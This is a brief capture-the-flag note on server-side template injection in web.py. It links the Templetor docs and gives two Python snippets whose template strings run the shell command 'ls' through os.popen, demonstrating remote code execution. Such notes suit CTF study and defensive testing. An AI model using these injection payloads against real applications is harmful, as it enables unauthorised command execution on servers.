title:: CTF/SSTI/web.py

- # 文档
	- https://webpy.org/docs/0.3/templetor.zh-cn
- # RCE
	- ```python
	  import web
	  
	  s = "${__import__('os').popen('ls').read()}"
	  
	  print(web.template.Template(s)())
	  
	  ```
	- ```python
	  import web
	  
	  s = """
	  $code:
	      def f():
	          return __import__("os").popen("ls").read()
	  
	  $f()
	  """
	  
	  print(web.template.Template(s)())
	  
	  ```